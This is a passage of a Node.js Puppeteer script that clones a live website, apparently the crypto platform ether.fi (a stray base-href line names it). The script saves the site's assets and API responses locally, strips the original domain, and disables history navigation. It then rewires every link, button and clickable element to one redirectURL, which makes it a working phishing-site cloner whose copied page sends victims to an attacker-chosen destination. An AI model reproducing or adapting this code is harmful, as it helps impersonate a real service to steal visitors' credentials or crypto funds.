      console.log("‚úÖ Dynamic content loading complete");
    } catch (err) {
      console.warn("‚ö†Ô∏è Dynamic selector not found, proceeding with available content:", err.message);
    }

    // Retrieve dynamic scripts and images with retry
    let dynamicScripts = [];
    let dynamicImages = [];
    for (let attempt = 0; attempt < 3; attempt++) {
      try {
        dynamicScripts = await page.evaluate(() => window.__DYNAMIC_SCRIPTS__ || []);
        dynamicImages = await page.evaluate(() => window.__DYNAMIC_IMAGES__ || []);
        break;
      } catch (err) {
        console.warn(`‚ö†Ô∏è Retry ${attempt + 1}/3 for dynamic scripts/images: ${err.message}`);
        await page.waitForTimeout(1000);
      }
    }
    dynamicScripts.forEach((src) => additionalScripts.add(src));
    dynamicImages.forEach((src) => additionalImages.add(src));

    // Debug DOM content
    const dynamicElements = await page.evaluate(() => {
      return {
        nextRoot: !!document.querySelector("#__next"),
        main: !!document.querySelector("main"),
        dynamic: document.querySelectorAll("[data-testid], .dynamic-content, .swap-form, .price-chart, .logo").length,
        allElements: document.querySelectorAll("*").length,
        scripts: Array.from(document.querySelectorAll("script[src]")).map((s) => s.src),
        images: Array.from(document.querySelectorAll("img[src], img[data-src], img[data-lazy-src]")).map(
          (img) => img.src || img.getAttribute("data-src") || img.getAttribute("data-lazy-src")
        ),
      };
    });
    console.log("üïµÔ∏è‚Äç‚ôÇÔ∏è DOM Debug:", dynamicElements);

    const html = await page.content();
    const $ = cheerio.load(html);
    const baseHref = originalDomain;

    // Save External CSS
    const cssLinks = $('link[rel="stylesheet"]');
    for (const el of cssLinks.toArray()) {
      const href = $(el).attr("href");
      if (href && !href.startsWith("data:")) {
        try {
          const fullUrl = new URL(href, baseHref).href;
          const response = await page.goto(fullUrl, { waitUntil: "networkidle0", timeout: 15000 });
          const data = await response.text();
          const fileName = path.basename(new URL(href, baseHref).pathname).split("?")[0] || `style-${Date.now()}.css`;
          const filePath = path.join("css", fileName);
          await fs.outputFile(path.join(outputDir, filePath), data);
          $(el).attr("href", `css/${fileName}`);
          console.log("üìÅ Saved CSS:", filePath);
        } catch (err) {
          console.warn("‚ö†Ô∏è Failed to fetch CSS:", href, err.message);
          $(el).remove();
        }
      }
    }

    // Save External JS
    const scripts = new Set([...$('script[src]').toArray().map((el) => $(el).attr("src")), ...additionalScripts]);
    for (const src of scripts) {
      if (src && !src.startsWith("data:")) {
        try {
          const fullUrl = new URL(src, baseHref).href;
          console.log(`Processing script: src=${src}, fullUrl=${fullUrl}`);
          const response = await page.goto(fullUrl, { waitUntil: "networkidle0", timeout: 30000 });
          let scriptContent = await response.text();
          scriptContent = scriptContent
            .replace(/history\.replaceState/g, "/*history.replaceState*/")
            .replace(/history\.pushState/g, "/*history.pushState*/")
            .replace(new RegExp(originalDomain, "g"), "");
          const fileName = path.basename(new URL(fullUrl).pathname).split("?")[0] || `script-${Date.now()}.js`;
          const filePath = path.join("js", fileName);
          await fs.outputFile(path.join(outputDir, filePath), scriptContent);
          $(`script[src="${src}"]`).attr("src", `js/${fileName}`);
          console.log(`üìÅ Saved JS: ${filePath}`);
        } catch (err) {
          console.warn(`‚ö†Ô∏è Failed to fetch JS: ${src}, error: ${err.message}`);
          $(`script[src="${src}"]`).attr("src", "");
        }
      }
    }

    // Preserve Inline Scripts and Update Image References
    $("script:not([src])").each((_, el) => {
      let scriptContent = $(el).html();
      scriptContent = scriptContent
        .replace(/history\.replaceState/g, "/*history.replaceState*/")
        .replace(/history\.pushState/g, "/*history.pushState*/")
        .replace(new RegExp(originalDomain, "g"), "")
        .replace(/\/static\/media\/[^"]+\.(svg|png|jpg|jpeg|gif|webp)/g, (match) => {
          const baseName = match.includes("Untitled") ? "Untitled" : match.split(".")[0].split("/").pop();
          const ext = path.extname(match);
          return `images/${baseName}${ext}`;
        });
      $(el).html(scriptContent);
    });

    // Download Additional Resources
    const resourceExtToDir = {
      ".json": "resources",
      ".gltf": "resources",
      ".glb": "resources",
      ".bin": "resources",
    };
    for (const resourceUrl of additionalResources) {
      if (resourceUrl && !resourceUrl.startsWith("data:")) {
        try {
          const fullUrl = new URL(resourceUrl, baseHref).href;
          const response = await page.goto(fullUrl, { waitUntil: "networkidle0", timeout: 30000 });
          const data = await response.buffer();
          const ext = path.extname(new URL(fullUrl).pathname) || ".bin";
          const dir = resourceExtToDir[ext] || "resources";
          const fileName = path.basename(new URL(fullUrl).pathname).split("?")[0] || `resource-${Date.now()}${ext}`;
          const filePath = path.join(dir, fileName);
          await fs.outputFile(path.join(outputDir, filePath), data);
          console.log(`üìÅ Saved Resource: ${filePath}`);
          $("script").each((_, el) => {
            let content = $(el).html();
            if (content.includes(fullUrl)) {
              content = content.replace(fullUrl, `${dir}/${fileName}`);
              $(el).html(content);
            }
          });
        } catch (err) {
          console.warn(`‚ö†Ô∏è Failed to fetch resource: ${resourceUrl}, error: ${err.message}`);
        }
      }
    }

    // Download Images Locally
    const mimeToExt = {
      "image/png": ".png",
      "image/jpeg": ".jpg",
      "image/webp": ".webp",
      "image/gif": ".gif",
      "image/svg+xml": ".svg",
    };

    const seenFileNames = new Set();
    const getUniqueFileName = (baseName, ext) => {
      let fileName = baseName + ext;
      let counter = 1;
      while (seenFileNames.has(fileName)) {
        fileName = `${baseName}-${counter}${ext}`;
        counter++;
      }
      seenFileNames.add(fileName);
      return fileName;
    };

    const fetchImageWithPuppeteer = async (page, url) => {
      const imagePage = await page.browser().newPage();
      try {
        const response = await imagePage.goto(url, { waitUntil: "networkidle0", timeout: 30000 });
        const buffer = await response.buffer();
        const headers = response.headers();
        await imagePage.close();
        return { data: buffer, headers };
      } catch (err) {
        await imagePage.close();
        throw err;
      }
    };

    const getRawImageUrl = (url, baseHref) => {
      try {
        const fullUrl = new URL(url, baseHref).href;
        console.log(`Resolved image URL: ${url} -> ${fullUrl}`);
        return fullUrl;
      } catch (err) {
        console.warn(`‚ö†Ô∏è Invalid URL: ${url}, error: ${err.message}`);
        return null;
      }
    };

    // Collect images
    const imageSources = new Set([
      ...$('img[src]').toArray().map((el) => $(el).attr("src")),
      ...$('img[data-src]').toArray().map((el) => $(el).attr("data-src")),
      ...$('img[data-lazy-src]').toArray().map((el) => $(el).attr("data-lazy-src")),
      ...additionalImages,
      ...dynamicImages,
    ]);

    for (const src of imageSources) {
      if (src && !src.startsWith("data:") && src.trim() !== "") {
        try {
          let fullUrl = getRawImageUrl(src, baseHref);
          if (!fullUrl) {
            throw new Error(`No valid image URL for src=${src}`);
          }

          console.log(`Processing image: src=${src}, fullUrl=${fullUrl}`);

          const response = await fetchImageWithPuppeteer(page, fullUrl);
          const contentType = response.headers["content-type"] || "image/jpeg";
          const urlExt = path.extname(new URL(fullUrl).pathname).toLowerCase();
          const ext = mimeToExt[contentType] || (urlExt && [".png", ".jpg", ".jpeg", ".gif", ".svg", ".webp"].includes(urlExt) ? urlExt : ".jpg");
          let baseName = path.basename(new URL(fullUrl).pathname).split("?")[0];
          baseName = baseName.includes(".") ? baseName.split(".")[0] : `image-${Date.now()}`;

          // Special handling for logo SVG
          if (src.includes("/static/media/Untitled") && ext === ".svg") {
            baseName = "Untitled";
          }

          const fileName = getUniqueFileName(baseName, ext);
          const filePath = path.join("images", fileName);

          console.log(`Saving image to: ${path.join(outputDir, filePath)}`);
          await fs.outputFile(path.join(outputDir, filePath), response.data);

          // Update img tags
          $(`img[src="${src}"], img[data-src="${src}"], img[data-lazy-src="${src}"]`).each((_, el) => {
            $(el).attr("src", `images/${fileName}`);
            $(el).removeAttr("data-src");
            $(el).removeAttr("data-lazy-src");
            const srcset = $(el).attr("srcset");
            if (srcset) {
              const newSrcset = srcset
                .split(",")
                .map((entry) => {
                  const [_, descriptor] = entry.trim().split(" ");
                  return `images/${fileName} ${descriptor || "1x"}`;
                })
                .join(", ");
              $(el).attr("srcset", newSrcset);
            }
          });

          // Update inline styles
          $("[style]").each((_, el) => {
            let style = $(el).attr("style");
            if (style && style.includes(src)) {
              style = style.replace(src, `images/${fileName}`);
              $(el).attr("style", style);
            }
          });

          console.log(`üìÅ Saved Image: ${filePath}`);
        } catch (err) {
          console.warn(`‚ö†Ô∏è Failed to fetch or process image: src=${src}, error: ${err.message}`);
          $(`img[src="${src}"], img[data-src="${src}"], img[data-lazy-src="${src}"]`).attr("src", src);
        }
      } else {
        console.log(`Skipping invalid or empty image src: ${src}`);
        $(`img[src="${src}"], img[data-src="${src}"], img[data-lazy-src="${src}"]`).attr("src", "");
      }
    }

    // Inject API Responses and Mock Fetch
    const apiScript = `
      <script>
        window.__API_RESPONSES__ = ${JSON.stringify(apiResponses)};
        console.log("Injected API Responses:", Object.keys(window.__API_RESPONSES__));
        const originalFetch = window.fetch;
        window.fetch = async (url, ...args) => {
          if (window.__API_RESPONSES__[url]) {
            console.log("Mocking fetch for:", url);
            return Promise.resolve({
              ok: true,
              json: () => Promise.resolve(window.__API_RESPONSES__[url]),
            });
          }
          return originalFetch(url, ...args);
        };
      </script>
    `;
    $.root().append(apiScript);

    // Add Error Logging
    $.root().append(`
      <script>
        window.onerror = (msg, url, line) => {
          console.error("JS Error:", msg, "at", url, "line", line);
          return false;
        };
        document.querySelectorAll('img').forEach(img => {
          img.onerror = () => console.error('Failed to load image:', img.src);
          img.onload = () => console.log('Loaded image:', img.src);
        });
        document.querySelectorAll('script[src]').forEach(script => {
          script.onerror = () => console.error('Failed to load script:', script.src);
          script.onload = () => console.log('Loaded script:', script.src);
        });
      </script>
    `);

    // Redirect all links
    $("a[href]").each((_, el) => {
      $(el).attr("href", redirectURL);
      $(el).removeAttr("target");
    });

    // Redirect all buttons
    const buttonCount = $("button").length;
    $("button").each((_, el) => {
      $(el).attr("onclick", `window.location='${redirectURL}'`);
    });

    // Handle cursor:pointer inline styles
    let pointerCount = 0;
    $("[style]").each((_, el) => {
      const style = $(el).attr("style");
      if (style && style.toLowerCase().includes("cursor: pointer")) {
        $(el).attr("onclick", `window.location='${redirectURL}'`);
        pointerCount++;
      }
    });

    // Handle classes with cursor:pointer
    const pointerClasses = new Set();
    $("style").each((_, el) => {
      const css = $(el).html();
      const matches = css?.match(/\.([\w-]*)\s*{[^}]*cursor\s*:\s*pointer[^}]*}/gi);
      if (matches) {
        matches.forEach((rule) => {
          const classMatch = rule.match(/\.([\w-]*)/);
          if (classMatch) pointerClasses.add(classMatch[1]);
        });
      }
    });

    for (const className of pointerClasses) {
      $(`.${className}`).attr("onclick", `window.location='${redirectURL}'`);
      pointerCount += $(`.${className}`).length;
    }

    console.log("üéØ Pointer-style elements redirected:", pointerCount);
    console.log("üîò <button> elements redirected:", buttonCount);
    console.log("üîó <a> links replaced with:", redirectURL);

    // Save Final HTML
    await fs.outputFile(path.join(outputDir, "index.html"), $.html());
    console.log("‚úÖ Done! Saved at cloned/index.html");

    await browser.close();
    return {
      success: true,
      message: "Scraping completed",
      output: "cloned/index.html",
    };
  } catch (err) {
    console.error("‚ùå Scraping failed:", err.message, err.stack);
    throw err;
  }
}

// Execute the scrape function
(async () => {
  try {
    const result = await scrape();
    console.log(result.message, "Output:", result.output);
    console.log("To view the cloned site, serve the 'cloned' directory with a local server:");
    console.log("  npm install -g http-server");
    console.log("  http-server ./cloned -p 8080");
    console.log("Then open http://localhost:8080/index.html in your browser.");
  } catch (err) {
    console.error("Script execution failed:", err.message);
    process.exit(1);
  }
})();


    <base href="https://www.ether.fi">






